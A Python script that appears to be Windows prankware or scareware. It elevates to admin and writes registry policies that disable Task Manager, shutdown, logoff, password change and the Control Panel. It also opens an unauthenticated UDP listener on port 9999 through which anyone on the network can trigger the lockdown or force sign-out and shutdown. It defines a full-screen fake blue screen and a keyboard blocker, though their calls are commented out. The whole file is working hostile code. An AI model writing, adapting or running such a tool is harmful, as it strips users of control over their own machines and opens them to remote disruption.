import os, sys, pyuac, socket, pynput, threading, subprocess

try:
    if not pyuac.isUserAdmin():pyuac.runAsAdmin()
    if not pyuac.isUserAdmin():sys.exit(0)
except:sys.exit(0)

def manipulate_reg_func(zero_or_one):
    try:
        subprocess.run("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep /v value /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Start\HideRestart /v value /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown /v value /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v StartMenuLogOff /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
        subprocess.run("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisableNotificationCenter /t REG_DWORD /d {} /f".format(zero_or_one), shell=True, creationflags=0x08000000)
    except Exception as e:print(e)

manipulate_reg_func(1)

rootvar = False
UDP_PORT = 9999
BUFFER_SIZE = 1024
DISCOVERY_MSG = "DISCOVER"
RESPONSE_MSG = b"RESPONSE"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("", UDP_PORT))

block_keyboard = pynput.keyboard.Listener(suppress=True)

def fake_bsod():
    global root

    import qrcode, tkinter as tk
    from tkinter import font
    from PIL import Image, ImageTk

    root = tk.Tk()
    root.title("Windows 11 BSOD")
    root.configure(bg='#0078d4', cursor='none')
    root.lift()
    root.attributes('-topmost', True)
    root.attributes('-fullscreen', True)

    font_huge = font.Font(family="Segoe UI Light", size=150, weight="normal")
    font_large = font.Font(family="Segoe UI", size=28, weight="normal")
    font_med = font.Font(family="Segoe UI", size=20, weight="normal")
    font_small = font.Font(family="Segoe UI", size=16, weight="normal")

    # Main container with proper centering
    main_container = tk.Frame(root, bg='#0078d4')
    main_container.pack(expand=True, fill='both')

    # Center frame positioned like real BSOD - adjusted to avoid overlap
    center = tk.Frame(main_container, bg='#0078d4')
    center.place(relx=0.1, rely=0.1, anchor='nw')

    # Sad face - using proper ":(" characters
    sad_face = tk.Label(center, text=":(", bg='#0078d4', fg='white', font=font_huge)
    sad_face.pack(anchor='w')

    # Main error message
    msg = tk.Label(center, text="Your PC ran into a problem and needs to restart. We're just\ncollecting some error info, and then we'll restart for you.",  bg='#0078d4', fg='white', font=font_large, justify='left')
    msg.pack(anchor='w', pady=(50, 0))

    # Bottom section with QR and info
    bottom_container = tk.Frame(main_container, bg='#0078d4')
    bottom_container.place(relx=0.1, rely=0.65, anchor='nw')

    bottom_frame = tk.Frame(bottom_container, bg='#0078d4')
    bottom_frame.pack(anchor='w')

    # QR Code on left
    qr = qrcode.QRCode(version=1, box_size=4, border=2)
    qr.add_data('FUCK OFF !!!')
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="white", back_color="#0078d4").resize((140,140), Image.Resampling.LANCZOS)
    qr_photo = ImageTk.PhotoImage(qr_img)
    qr_label = tk.Label(bottom_frame, image=qr_photo, bg='#0078d4')
    qr_label.pack(side='left', anchor='nw')

    # Info text on right
    info_frame = tk.Frame(bottom_frame, bg='#0078d4')
    info_frame.pack(side='left', padx=(50,0), anchor='nw')

    info_text = tk.Label(info_frame, text="For more information about this issue and possible fixes, visit\nhttps://www.windows.com/stopcode\n\nIf you call a support person, give them this info:", bg='#0078d4', fg='white', font=font_small, justify='left')
    info_text.pack(anchor='w')

    stop_code = tk.Label(info_frame, text="Stop code: CRITICAL_PROCESS_DIED", bg='#0078d4', fg='white', font=font_small)
    stop_code.pack(anchor='w', pady=(15,0))

    failed_info = tk.Label(info_frame, text="What failed: csrss.exe", bg='#0078d4', fg='white', font=font_small)
    failed_info.pack(anchor='w', pady=(8,0))

    root.mainloop()

while True:
    try:
        data, addr = sock.recvfrom(1024)
        message = data.decode().strip()
        print(message)

        if message == DISCOVERY_MSG:sock.sendto(RESPONSE_MSG, addr)
        elif message == "startbsod":
            if not rootvar:
                rootvar = True
                # threading.Thread(target = fake_bsod, daemon = True).start()
            # else:root.deiconify()
            manipulate_reg_func(1)
            # block_keyboard.start()
        elif message == "stopbsod":
            # block_keyboard.stop()
            manipulate_reg_func(0)
            # if rootvar:root.withdraw()
        elif message == "signout":os.system("shutdown /l /f")
        elif message == "shutdown":os.system("shutdown /s /t 0 /f")
        elif message == "exit":break
    except Exception as e:print(e)